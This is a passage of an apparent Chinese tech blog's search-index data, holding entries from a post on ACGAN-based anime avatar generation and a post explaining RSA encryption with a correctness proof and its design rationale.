2017\uff09\u6765\u5b9e\u73b0\u3002</p> <p></p> <p></p> <p>\u5982\u4e0a\u6240\u793a\uff0cACGAN \u7684\u60f3\u6cd5\u975e\u5e38\u7b80\u5355\uff0cDiscriminator \u9664\u4e86\u88ab\u7528\u6765\u7ed9\u771f\u5b9e\u5ea6\u8bc4\u5206\uff0c\u5176\u63d0\u53d6\u7684\u56fe\u50cf\u7279\u5f81\u8fd8\u88ab\u7528\u6765\u505a\u5206\u7c7b\uff0c\u5224\u5b9a\u8f93\u5165\u56fe\u7247\u7684\u7c7b\u522b\u3002\u751f\u6210\u5668\u9664\u4e86\u63d0\u4f9b\u4e00\u4e2a\u566a\u97f3\uff0c\u8fd8\u9700\u8981\u63d0\u4f9b\u4e00\u4e2a\u7c7b\u6761\u4ef6\u3002</p> <p>Loss Function \u5728\u65e0\u6761\u4ef6 GAN \u7684\u57fa\u7840\u4e0a\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5206\u7c7b\u635f\u5931\u9879\uff0c\u8bad\u7ec3 Discriminator \u7684\u65f6\u5019\uff0c\u4f1a\u5f15\u5bfc Discriminator \u5bf9\u6570\u636e\u96c6\u4e2d\u56fe\u7247\u505a\u51fa\u6b63\u786e\u5206\u7c7b\uff0c\u8bad\u7ec3 Generator \u7684\u65f6\u5019\u4f1a\u5f15\u5bfc\u751f\u6210\u5668\u4ea7\u751f\u4e0e\u7c7b\u6761\u4ef6\u4e00\u81f4\u7684\u7ed3\u679c\u3002</p> <p>\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u539f\u8bba\u6587\u4e2d\u6ca1\u6709\u8003\u8651 lambda \u7684\u53d6\u503c\uff0c\u6211\u4eec\u6dfb\u52a0\u4e86\u4e00\u4e2a lambda \u503c\u6765\u5e73\u8861\u7f51\u7edc\u5bf9\u771f\u5b9e\u5ea6/\u7c7b\u522b\u7684\u53d6\u820d\u3002\u6211\u4eec\u5728\u5b9e\u9a8c\u4e2d\u53d1\u73b0\u4e86 lambda \u4f1a\u660e\u663e\u7684\u5bf9\u751f\u6210\u7ed3\u679c\u4ea7\u751f\u5f71\u54cd\u3002lambda \u592a\u5927\uff0c\u4f1a\u5bfc\u81f4\u5206\u7c7b\u5931\u8d25\uff0clambda \u592a\u5c0f\uff0c\u4f1a\u5f71\u54cd\u56fe\u7247\u751f\u6210\u7684\u8d28\u91cf\u3002</p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#\u67b6\u6784\u7684\u9009\u62e9","title":"\u67b6\u6784\u7684\u9009\u62e9","text":"<p>\u6211\u4eec\u5728\u539f\u5148\u7684 DCGAN \u7684 discriminator \u67b6\u6784\u4e0a\u505a\u4e86\u4e00\u70b9\u5fae\u8c03\uff0c\u4f7f\u5f97\u5b83\u80fd\u4ea7\u751f\u4e24\u79cd\u8f93\u51fa\uff1a</p> <p></p> <p>\u5b9e\u9a8c\u7ed3\u679c\u663e\u793a\uff0c\u5b83\u6210\u529f\u7684\u505a\u51fa\u4e86\u5206\u7c7b\uff0c\u4f46\u662f\u751f\u6210\u56fe\u7247\u7684\u8d28\u91cf\u5374\u4e0b\u964d\u4e86\uff1a</p> <p></p> <p>\u5982\u56fe\uff0c\u53ef\u4ee5\u770b\u5230\u751f\u6210\u7ed3\u679c\u7684\u6e05\u6670\u5ea6\u4e25\u91cd\u964d\u4f4e\uff0c\u8138\u90e8\u5d29\u574f\u7684\u6982\u7387\u4e5f\u63d0\u9ad8\u4e86\uff0c\u5e76\u4e14\u518d\u7ee7\u7eed\u8bad\u7ec3\u4e0b\u53bb\u4e5f\u6ca1\u6709\u660e\u663e\u7684\u6539\u53d8\u3002</p> <p>\u8003\u8651\u5230 Discriminator \u548c Generator \u90fd\u8981\u5904\u7406 class \u7684\u4fe1\u606f\uff0c\u9700\u8981\u62df\u5408\u7684\u5173\u7cfb\u53d8\u5f97\u66f4\u52a0\u590d\u6742\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u56e0\u4e3a\u539f\u6765\u7684\u7f51\u7edc\u8868\u793a\u529b\u4e0d\u591f\u3002\u4e8e\u662f\u6211\u4eec\u53c2\u8003\u4e86\u91c7\u7528\u4e86 MakeGirlsMoe \u9879\u76ee\u539f\u4f5c\u8005\u4f7f\u7528\u7684\u4e00\u5957\u6b8b\u5dee\u7f51\u7edc\u8bbe\u8ba1\uff1a</p> <p></p> <p></p> <p>\u8fd9\u5957\u7f51\u7edc\u5176\u5b9e\u4e5f\u662f\u57fa\u672c\u4e0a\u57fa\u4e8e SRResNet\uff08\u300aPhoto-Realistic Single Image Super-Resolution Using a Generative Adversarial Network\u300b, Christian Ledig et. al 2017\uff09\u6539\u9020\u800c\u6210\u7684\u3002</p> <p>\u4f46\u662f\u53d1\u73b0\u4ea7\u751f\u7684\u7ed3\u679c\u5206\u7c7b\u5931\u8d25\u4e86\uff1a</p> <p></p> <p>\u5982\u56fe\uff0c\u539f\u672c\u6bcf\u4e00\u884c\u5e94\u8be5\u662f\u4e00\u6837\u7684\u53d1\u8272\u548c\u773c\u775b\u989c\u8272\uff0c\u4f46\u662f\u751f\u6210\u7ed3\u679c\u5374\u6ca1\u6709\u4f53\u73b0\u51fa\u8fd9\u79cd\u5206\u7c7b\u6548\u679c\u3002\u4e0d\u8fc7\u6211\u4eec\u53d1\u73b0\u56fe\u7247\u8d28\u91cf\u7684\u786e\u975e\u5e38\u9ad8\uff0c\u5982\u679c\u4ec5\u7528\u968f\u673a\u751f\u6210\u7684\u6807\u51c6\u6765\u8bc4\u5224\uff0c\u5b83\u5e94\u8be5\u8981\u4f18\u4e8e\u539f\u6765\u7684 DCGAN \u7f51\u7edc\u7ed3\u6784\u3002</p> <p>\u6211\u4eec\u63a8\u6d4b\u5f88\u6709\u53ef\u80fd\u662f\u5728\u8fd9\u79cd\u7f51\u7edc\u8bbe\u8ba1\u4e0b\uff0clambda \u53d6\u592a\u5927\uff0c\u771f\u5b9e\u5ea6\u7684 loss \u538b\u8fc7\u4e86\u5206\u7c7b\u7684 loss\uff0c\u4f7f\u5f97\u771f\u5b9e\u5ea6\u5f97\u5230\u4e86\u5f88\u597d\u7684\u6ee1\u8db3\uff0c\u5206\u7c7b\u5374\u6ca1\u6709\u5f88\u597d\u7684\u5f97\u5230\u4fdd\u969c\u3002</p> <p>\u6211\u4eec\u628a\u7f51\u7edc\u7684 lambda \u53d6\u56de 1 \u540e\uff0c\u53c8\u4e0d\u5e78\u7684\u53d1\u73b0\uff0c\u5206\u7c7b\u7684\u6548\u679c\u867d\u7136\u6062\u590d\u4e86\uff0c\u751f\u6210\u7684\u8d28\u91cf\u53c8\u4e0b\u964d\u4e86\u3002</p> <p></p> <p>\u628a lambda \u5728 1~5 \u4e4b\u95f4\u90fd\u5c1d\u8bd5\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u4e24\u8005\u6709\u660e\u663e\u7684\u51b2\u7a81\u3002\u8d28\u91cf\u9ad8\u4e86\uff0c\u5206\u7c7b\u5c31\u53d8\u5f31\u3002\u5206\u7c7b\u53d8\u597d\u4e86\uff0c\u8d28\u91cf\u53c8\u5f31\u4e86\u3002</p> <p>\u8fd9\u8ba9\u6211\u4eec\u610f\u8bc6\u5230 ACGAN \u7684\u8bbe\u8ba1\u53ef\u80fd\u5e76\u4e0d\u5408\u7406\uff0cACGAN \u5728\u5224\u5b9a\u771f\u5b9e\u5ea6\u4e0e\u5224\u5b9a\u7c7b\u522b\u7684\u65f6\u5171\u4eab\u4e00\u4e2a\u7279\u5f81\u63d0\u53d6\u5668\u3002\u4f46\u662f\u8fd9\u4e24\u4e2a\u4efb\u52a1\u4e4b\u95f4\u5e76\u6ca1\u6709\u5fc5\u7136\u7684\u91cd\u53e0\u6027\uff0c\u5c31\u50cf\u8981\u5224\u65ad\u4e00\u4e2a\u4eba\u662f\u7537\u6027\u8fd8\u662f\u5973\u6027\u548c\u5224\u522b\u4e00\u4e2a\u5bf9\u8c61\u5230\u5e95\u662f\u4e0d\u662f\u4eba\u53ef\u80fd\u7528\u5230\u7684\u7279\u5f81\u6839\u672c\u5c31\u6ca1\u6709\u592a\u5927\u4ea4\u53e0\u6027\u3002\u5982\u679c\u5171\u4eab\u7f51\u7edc\uff0c\u5219\u4f1a\u5bfc\u81f4\u4e24\u4e2a\u4efb\u52a1\u7ade\u4e89\u8d44\u6e90\u3002</p> <p>\u4e8e\u662f\u6211\u4eec\u5bf9\u7f51\u7edc\u505a\u4e86\u4e00\u4e9b\u6298\u4e2d\u7684\u8c03\u6574\uff0c\u5c06 ResNet \u63d0\u53d6\u7684\u7279\u5f81\u5206\u522b\u9001\u5165\u4e24\u4e2a\u66f4\u6df1\uff083 \u5c42\uff09\u7684\u5168\u8fde\u63a5\u5c42\u7f51\u7edc\uff0c\u518d\u53d6 lambda=5 \u65f6\u3002\u8fd9\u6837\u53ef\u4ee5\u964d\u4f4e\u4e24\u4e2a\u4efb\u52a1\u5bf9\u6a21\u5757\u4f9d\u8d56\u7684\u8026\u5408\u6027\u3002\u8ba9\u4e24\u4e2a\u4efb\u52a1\u7684\u533a\u522b\u5c3d\u91cf\u4f53\u73b0\u5728\u81ea\u5df1\u72ec\u5360\u7684\u5168\u8fde\u63a5\u5c42\u7f51\u7edc\u4e0a\uff0c\u8ba9\u4e24\u8005\u7684\u91cd\u53e0\u90e8\u5206\u53c8 ResNet \u53bb\u89e3\u51b3\u3002</p> <p>\u6700\u540e\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u8f83\u4e3a\u51fa\u8272\u7684\u6548\u679c\uff1a</p> <p></p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#\u5b9e\u9a8c\u7ed3\u679c\u5c55\u793a","title":"\u5b9e\u9a8c\u7ed3\u679c\u5c55\u793a","text":"<p>250 \u4e2a epoch \u4e4b\u540e\uff0c\u6211\u4eec\u9009\u62e9\u4e86\u51e0\u7ec4\u7279\u5f81\u6761\u4ef6\uff0c\u968f\u673a\u4ea7\u751f\uff1a</p> <ul> <li>Aqua hair and Orange eyes</li> </ul> <p></p> <ul> <li>Black hair and Yellow eyes</li> </ul> <p></p> <ul> <li>Blond hair and Purple eyes</li> </ul> <p></p> <ul> <li>Blue hair and Blue eyes</li> </ul> <p></p> <ul> <li>White hair and Gray eyes</li> </ul> <p></p> <ul> <li>Pink hair and Orange eyes</li> </ul> <p></p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#\u6f5c\u5728\u7684\u4f18\u5316\u7a7a\u95f4","title":"\u6f5c\u5728\u7684\u4f18\u5316\u7a7a\u95f4","text":"<ul> <li> <p>\u6211\u4eec\u53d1\u73b0 ACGAN \u7684\u8bbe\u8ba1\u53ef\u80fd\u5e76\u4e0d\u5408\u7406\uff0c\u5171\u4eab\u5206\u7c7b\u548c\u771f\u5b9e\u5ea6\u8bc4\u4f30\u53ef\u80fd\u672c\u6765\u5c31\u4e0d\u662f\u4e00\u4e2a\u597d\u7684\u4e3b\u4e49\u3002\u5982\u679c\u4e0d\u8003\u8651\u65f6\u95f4\u548c\u7a7a\u95f4\uff0c\u7528\u4e24\u4e2a\u7f51\u7edc\u5206\u522b\u5206\u7c7b\u548c\u8bc4\u4f30\u771f\u5b9e\u5ea6\u5e94\u8be5\u53ef\u4ee5\u671f\u671b\u5f97\u5230\u66f4\u597d\u7684\u6548\u679c\u3002\u91c7\u7528\u5176\u5b83\u8bbe\u8ba1\u7c7b\u578b\u7684 CGAN \u6a21\u578b\u4e5f\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u9009\u62e9\u3002</p> </li> <li> <p>\u91c7\u7528\u66f4\u597d\u7684\u6570\u636e\u96c6\u3002\u6211\u4eec\u53d1\u73b0 MakeGirlsMoe \u8fd9\u4e2a\u9879\u76ee\uff0c\u5b83\u4eec\u4e4b\u6240\u4ee5\u80fd\u751f\u6210\u5f88\u7cbe\u81f4\u7684\u56fe\u7247\uff0c\u5f88\u5927\u7a0b\u5ea6\u4e0a\u53ef\u80fd\u662f\u56e0\u4e3a\u4f7f\u7528\u4e86\u4f18\u79c0\u7684\u6570\u636e\u96c6\uff0c\u6839\u636e\u539f\u4f5c\u8005\u7684\u4ecb\u7ecd\uff0c\u5b83\u4eec\u91c7\u7528\u7684\u6570\u636e\u96c6\u4e2d\u56fe\u7247\u753b\u98ce\u5f88\u4e00\u81f4\uff0c\u8d28\u91cf\u90fd\u5f88\u9ad8\u3002\u800c\u6211\u4eec\u4f7f\u7528\u7684\u6570\u636e\u96c6\u662f\u53f0\u6e7e\u5927\u5b66\u674e\u5b8f\u6bc5\u8001\u5e08\u5728 MLDS \u8fd9\u95e8\u8bfe\u7a0b\u4e2d\u63d0\u4f9b\u7684\u4e00\u4e2a toy data set\uff0c\u6211\u4eec\u6d4f\u89c8\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u91cc\u9762\u4e0d\u4ec5\u6709\u5973\u6027\u4eba\u7269\u7684\u753b\u50cf\uff0c\u8fd8\u6df7\u5165\u4e86\u4e00\u5b9a\u6bd4\u4f8b\u7684\u7537\u6027\u4eba\u7269\u753b\u50cf\uff0c\u800c\u4e14\u6709\u7684\u56fe\u7247\u672c\u8eab\u5c31\u753b\u5f97\u5f88\u5d29\u3002\u8fd9\u5f88\u5927\u7a0b\u5ea6\u4e0a\u4f1a\u4e3a\u5bf9\u6211\u4eec\u7684 generator \u4ea7\u751f\u5e72\u6270\u3002</p> </li> </ul> <p></p> <ul> <li>\u6211\u4eec\u7531\u4e8e\u53ea\u6709 64x64 \u7684\u8bad\u7ec3\u6570\u636e\uff0c\u6240\u4ee5\u4e5f\u53ea\u80fd\u4ea7\u751f 64x64 \u7684\u7ed3\u679c\u3002\u501f\u52a9 stackGAN \u6280\u672f\u548c\u66f4\u5927\u5c3a\u5bf8\u7684\u8bad\u7ec3\u56fe\u7247\uff0c\u6211\u4eec\u53ef\u4ee5\u751f\u6210\u5206\u8fa8\u7387\u66f4\u9ad8\u7684\u56fe\u7247\u3002</li> </ul>"},{"location":"blog/2019/06/21/rsa-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%A6%E6%80%9D%E6%83%B3/","title":"RSA \u52a0\u5bc6\u7b97\u6cd5\u53ca\u5176\u6570\u5b66\u601d\u60f3","text":"<p>AI Generated Abstract</p> <p>RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u65b9\u6cd5\uff0c\u5176\u6838\u5fc3\u601d\u60f3\u57fa\u4e8e\u6570\u8bba\u4e2d\u7684\u6b27\u62c9\u5b9a\u7406\u548c\u5927\u7d20\u6570\u5206\u89e3\u7684\u56f0\u96be\u6027\u3002\u672c\u6587\u4ece RSA \u7684\u57fa\u672c\u539f\u7406\u51fa\u53d1\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u5176\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u5e76\u901a\u8fc7\u6570\u5b66\u8bc1\u660e\u9a8c\u8bc1\u4e86\u5176\u6b63\u786e\u6027\u3002\u6b64\u5916\uff0c\u6587\u7ae0\u6df1\u5165\u63a2\u8ba8\u4e86 RSA \u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u5305\u62ec\u6052\u7b49\u6620\u5c04\u7684\u6784\u9020\u3001\u6a21\u6570\u9009\u62e9\u7684\u7b56\u7565\u4ee5\u53ca\u5b89\u5168\u6027\u5206\u6790\uff0c\u5e2e\u52a9\u8bfb\u8005\u5168\u9762\u7406\u89e3 RSA \u7b97\u6cd5\u7684\u6570\u5b66\u672c\u8d28\u4e0e\u5e94\u7528\u573a\u666f\u3002</p> <p>\u50cf DES \u4ee5\u53ca AES \u8fd8\u6709\u90a3\u4e9b\u7ecf\u5178\u7684\u53e4\u5178\u52a0\u5bc6\u7b97\u6cd5\uff0c\u90fd\u5c5e\u4e8e\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236\uff0c\u52a0\u5bc6\u548c\u89e3\u5bc6\u5fc5\u987b\u8981\u4f7f\u7528\u540c\u4e00\u5957\u5bc6\u94a5\u3002\u8fd9\u6837\u4e00\u5957\u5bf9\u79f0\u7684\u5bc6\u7801\u7cfb\u7edf\uff0c\u53d1\u9001\u4fe1\u606f\u548c\u63a5\u6536\u4fe1\u606f\u7684\u53cc\u65b9\u90fd\u8981\u638c\u63e1\u8fd9\u4e2a\u5bc6\u94a5\u624d\u80fd\u52a0\u5bc6\u548c\u89e3\u5bc6\uff0c\u4efb\u4f55\u4e00\u65b9\u6cc4\u9732\u4e86\u5bc6\u94a5\uff0c\u6570\u636e\u7684\u5b89\u5168\u5c31\u4f1a\u906d\u5230\u5a01\u80c1\u3002</p> <p>RSA \u7b97\u6cd5\u662f 1977 \u5e74\u7531 Ron Rivest, Adi Shamir, Leonard Adleman \u63d0\u51fa\u7684\u516c\u94a5\u5bc6\u7801\u4f53\u5236 (public-key cryptosystem)\uff0c\u516c\u94a5\u5bc6\u7801\u4f53\u5236\u4e5f\u79f0\u975e\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236 (asymmetric cryptosystem)\u3002</p> <p>\u5728\u516c\u94a5\u5bc6\u7801\u4f53\u5236\u4e2d\uff0c\u52a0\u5bc6\u5bc6\u94a5\u4e0e\u89e3\u5bc6\u5bc6\u94a5\u662f\u4e0d\u540c\u7684\uff0c\u52a0\u5bc6\u5bc6\u94a5\u7b80\u79f0\u516c\u94a5 (public key)\uff0c\u662f\u53ef\u4ee5\u516c\u5f00\u7684\uff0c\u89e3\u5bc6\u5bc6\u94a5\u7b80\u79f0\u79c1\u94a5 (private key)\uff0c\u662f\u9700\u8981\u88ab\u4fdd\u62a4\u7684\u3002</p> <p>\u5728\u4e00\u4e9b\u573a\u5408\u4e0b\uff0c\u6bd4\u5982\u8bf4\u6d88\u606f\u63a5\u6536\u8005\u5728\u4e00\u4e2a\u5b89\u4fdd\u63aa\u65bd\u975e\u5e38\u597d\u7684\u519b\u4e8b\u4e2d\u5fc3\uff0c\u800c\u6d88\u606f\u53d1\u9001\u8005\u662f\u6563\u5e03\u5728\u4e16\u754c\u5404\u5730\u7684\u63a2\u5458\uff0c\u6211\u4eec\u53ef\u4ee5\u53ea\u544a\u8bc9\u8fd9\u4e9b\u63a2\u5458\u516c\u94a5\uff0c\u4ed6\u4eec\u53ea\u77e5\u9053\u5982\u4f55\u5229\u7528\u5b83\u52a0\u5bc6\uff0c\u800c\u4e0d\u77e5\u9053\u5982\u4f55\u89e3\u5bc6\uff0c\u5c31\u7b97\u88ab\u6293\u4e86\uff0c\u4e5f\u65e0\u6cd5\u5a01\u80c1\u8fd9\u5957\u52a0\u5bc6\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u56e0\u4e3a\u80fd\u7834\u8bd1\u8fd9\u4e9b\u6d88\u606f\u7684\u4eba\u53ea\u6709\u53d7\u5230\u4e25\u683c\u4fdd\u62a4\u7684\u62e5\u6709\u79c1\u94a5\u7684\u4eba\u3002\u8fd9\u4e5f\u662f\u8fd9\u5957\u975e\u5bf9\u79f0\u52a0\u5bc6\u7cfb\u7edf\u7684\u5f3a\u5927\u4e4b\u5904\u3002</p> <p>\u770b\u4e86\u770b\u7f51\u4e0a\u5f88\u591a\u5173\u4e8e RSA \u7684\u6587\u7ae0\uff0c\u4e5f\u770b\u4e86\u767d\u6d2a\u6b22\u7684\u5bc6\u7801\u5b66\u8bb2\u4e49\uff0c\u751a\u81f3\u8fd8\u7ffb\u4e86\u7ffb\u300a\u79bb\u6563\u6570\u5b66\u53ca\u5176\u5e94\u7528\u300b\uff0c\u53d1\u73b0\u5bf9 RSA \u7684\u8bb2\u89e3\u90fd\u662f\u8bc1\u660e\u5b8c\u5176\u6b63\u786e\u6027\u5c31\u70b9\u5230\u4e3a\u6b62\u4e86\u3002</p> <p>\u4f46\u662f\u663e\u7136 RSA \u7684\u7cbe\u9ad3\u662f\u5176\u6784\u9020\u8fc7\u7a0b\uff0c\u5176\u8bbe\u8ba1\u601d\u60f3\u3002\u5728\u6211\u770b\u6765\uff0c\u5149\u8bc1\u660e\u5176\u6b63\u786e\u6027\u6ca1\u6709\u4efb\u4f55\u610f\u4e49\u3002\u9664\u4e86\u77e5\u9053\u5b83\u662f\u5bf9\u7684\uff0c\u4e0d\u80fd\u5e26\u6765\u4efb\u4f55\u6536\u83b7\u3002</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u9664\u4e86\u7b80\u5355\u7684\u4ecb\u7ecd RSA \u7b97\u6cd5\u7684\u8fc7\u7a0b\uff0c\u5e76\u5bf9\u5176\u6b63\u786e\u6027\u505a\u4e00\u4e2a\u6570\u5b66\u8bc1\u660e\uff0c\u8fd8\u4f1a\u4ece\u6784\u9020\u6cd5\u7684\u89d2\u5ea6\u4ed4\u7ec6\u8ba8\u8bba RSA \u7684\u6838\u5fc3\u8bbe\u8ba1\u601d\u8def\u3002\u8fd9\u4e2a\u601d\u8def\u5e76\u4e0d\u590d\u6742\uff0c\u53ea\u8981\u5bf9\u57fa\u672c\u7684\u6570\u8bba\u77e5\u8bc6\u6709\u6240\u4e86\u89e3\uff0c\u5c31\u5f88\u5bb9\u6613\u987a\u7740\u903b\u8f91\u8d70\u901a\u3002\u6587\u7ae0\u4f1a\u6d89\u53ca\u5230\u4e00\u4e9b\u6bd4\u8f83\u57fa\u7840\u7684\u6570\u8bba\u77e5\u8bc6\uff0c\u5982\u679c\u5bf9\u76f8\u5173\u77e5\u8bc6\u4e0d\u592a\u719f\u6089\uff0c\u53ef\u4ee5\u53c2\u8003\uff1aRSA \u4e2d\u7684\u6570\u8bba\u77e5\u8bc6\u3002</p>"},{"location":"blog/2019/06/21/rsa-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%A6%E6%80%9D%E6%83%B3/#\u57fa\u672c\u6a21\u5f0f","title":"\u57fa\u672c\u6a21\u5f0f","text":"<ul> <li>\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u7b49\u7684\u5927\u7d20\u6570 p \u548c q\u3002</li> <li>\u8ba1\u7b97\u51fa n=p*q\u3002</li> <li>\u6311\u9009\u4e00\u4e2a\u6570 e\uff0c\u4f7f\u5f97\u5b83\u548c (p-1)(q-1) \u4e92\u7d20\u3002</li> <li>\u8ba1\u7b97 e \u5728\u6a21 (p-1)(q-1) \u610f\u4e49\u4e0b\u7684\u9006\u5143 d\u3002</li> <li>\u516c\u5f00\uff08e,n\uff09\u4f5c\u4e3a\u516c\u94a5\u3002</li> <li> <p>\u4fdd\u7559\uff08d,n\uff09\u4f5c\u4e3a\u79c1\u94a5\u3002</p> </li> <li> <p>\u52a0\u5bc6\u4e00\u4e2a\u6570 M\uff1a\\(Cipher=M^e\\ \\ (mod\\ n)\\)</p> </li> <li> <p>\u89e3\u5bc6\u4e00\u6761\u5bc6\u6587\uff1a\\(Plaintext=Cipher^d\\ \\ (mod\\ n)\\)</p> </li> </ul>"},{"location":"blog/2019/06/21/rsa-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%A6%E6%80%9D%E6%83%B3/#\u5206\u6790","title":"\u5206\u6790","text":"<p>RSA \u7b97\u6cd5\u4fdd\u8bc1\uff1a\u5728\u516c\u5f00 e \u548c n \u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\uff08\u5c0f\u4e8e n\uff0c\u4e0d\u88ab p \u548c q \u6574\u9664\uff09\u7684 M\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u901a\u8fc7\\(Cipher=M^e \\ mod\\ n\\) \u6765\u5bf9 M \u52a0\u5bc6\u3002\u901a\u8fc7\u4fdd\u5b58\u7684\u79c1\u94a5 d \u53ef\u4ee5\u6062\u590d\uff1a\\(Plaintext=Cipher^d\\equiv M\\ (mod\\ n)\\)\u3002</p> <p>RSA \u4e2d\uff0cn \u662f\u4e24\u4e2a\u5927\u7d20\u6570 p \u548c q \u7684\u4e58\u79ef\uff0ce \u662f\u6311\u9009\u51fa\u6765\u7684\u4e00\u4e2a\u4e0e (p-1)(q-1) \u4e92\u7d20\u7684\u6570 e\uff0cd \u662f e \u5728\u6a21 (p-1)(q-1) \u610f\u4e49\u4e0b\u7684\u4e58\u6cd5\u9006\u5143\u3002</p> <p>\u8fd9\u4e2a\u8bbe\u8ba1\u975e\u5e38\u7684\u8bb2\u7a76\uff0c\u8981\u7406\u89e3\u5176\u610f\u4e49\uff0c\u6211\u4eec\u5148\u8981\u80fd\u8bc1\u660e\uff0c\u4e0a\u8ff0\u89e3\u5bc6\u53d8\u6362\u7684\u6b63\u786e\u6027\u3002</p>"},{"location":"blog/2019/06/21/rsa-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%A6%E6%80%9D%E6%83%B3/#\u53d8\u6362\u7684\u6b63\u786e\u6027","title":"\u53d8\u6362\u7684\u6b63\u786e\u6027","text":"<p>\\(M^{ed} \\equiv M \\ \\ (mod \\ n)\\)</p> \\[ \u5df2\u77e5 ed \\equiv 1 \\ [mod \\ (p-1)(q-1)] \\] \\[ \u5219 ed=k(p-1)(q-1)+1 \\] \\[ M^{ed}=M * M^{ k(p-1)(q-1) } \\] <ul> <li>\u7531\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff1a$ p \u4e3a\u7d20\u6570\uff0c\u82e5 a \u4e0d\u80fd\u88ab p \u6574\u9664\uff0c\u5219 a^{p-1} \\equiv 1 \\ (mod\\ p) $</li> </ul> \\[ \u5219\u53ea\u8981 M \u65e2\u4e0d\u662f p \u4e5f\u4e0d\u662f q \u7684\u500d\u6570\uff1aM^{ed} \\equiv M \\ (mod\\ p) \\ \\ ; \\ \\ M^{ed} \\equiv M \\ (mod \\ q) \\] \\[ M^{ed}-M \\equiv 0 \\ (mod \\ p) \\] \\[ M^{ed}-M \\equiv 0 \\ (mod \\ q) \\] <ul> <li>\u7531\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff1a</li> </ul> \\[ \u6b63\u6574\u6570 m_1,m_2,m_3,......,m_n \u4e24\u4e24\u4e92\u7d20\uff0ca_1,a_2,a_3,......,a_n \u662f\u4efb\u610f\u6574\u6570\u3002 \\] \\[ x \\equiv a_1 \\ (mod\\;m_1) \\] \\[ x \\equiv a_2 \\ (mod\\;m_2) \\] \\[ ...... \\] \\[ x\\equiv a_n(mod \\ m_n) \\] \\[ \u6709\u552f\u4e00\u7684\u6a21 m=m_1m_2......m_n \u7684\u89e3\u3002 \\] \\[ \u4ee4 M_k=\\frac{m}{m_k},M_k \u5728\u6a21 m_k \u610f\u4e49\u4e0b\u7684\u4e58\u6cd5\u9006\u5143\u4e3a y_k[\u5373 M_ky_k\\equiv1\\;(mod\\;m_k)] \\] \\[ x=a_1M_1y_1+...+a_nM_ny_n. \\] \\[ \u7531\u4e8e p \u548c q \u4e92\u7d20\u3002 \\] \\[ \u56e0\u6b64\uff0cM^{ed}-M \\equiv 0 * (..) + 0 * (..) \\equiv 0 \\ (mod\\ n) \\] <p>     \u5f97\u8bc1\u00a0\\(M^{ed}\\equiv M \\ (mod\\ n)\\) </p>"},{"location":"blog/2019/06/21/rsa-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%A6%E6%80%9D%E6%83%B3/#\u8bbe\u8ba1\u601d\u60f3","title":"\u8bbe\u8ba1\u601d\u60f3","text":"<p>\u524d\u9762\u6211\u4eec\u7ed9\u51fa\u4e86 RSA \u6b63\u786e\u6027\u7684\u7b80\u5355\u8bc1\u660e\uff0c\u53ef\u4ee5\u770b\u5230\u5982\u4f55\u8bc1\u660e RSA \u7684\u6b63\u786e\u6027\u5e76\u4e0d\u662f\u4e00\u4ef6\u56f0\u96be\u7684\u4e8b\u3002\u4f46\u662f\u4f1a\u8bc1\u660e RSA \u7684\u6b63\u786e\u6027\uff0c\u53ea\u80fd\u8bf4\u660e\u4f60\u77e5\u9053 RSA\u201c\u4e3a\u4ec0\u4e48\u5bf9\u201d\uff0c\u4f46\u662f\u4f60\u53ef\u80fd\u5e76\u65e0\u6cd5\u7406\u89e3\u5176\u771f\u6b63\u7684\u8bbe\u8ba1\u601d\u60f3\u3002</p> <p>\u5728 RSA \u7684\u8bbe\u8ba1\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u6709\u4e24\u4e2a\u5173\u952e\u7684\u8981\u7d20\uff1a\u5927\u7d20\u6570 p \u548c q\uff0c(p-1)(q-1)\u3002\u65e2\u7136\u53d6\u4e86 n=pq\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981\u53d6 (p-1)(q-1)\uff0c\u4e3a\u4ec0\u4e48\u8981\u53d6\u4e00\u4e2a\u4e0e\u4e4b\u4e92\u7d20\u7684 e\uff0c\u9006\u5143 d 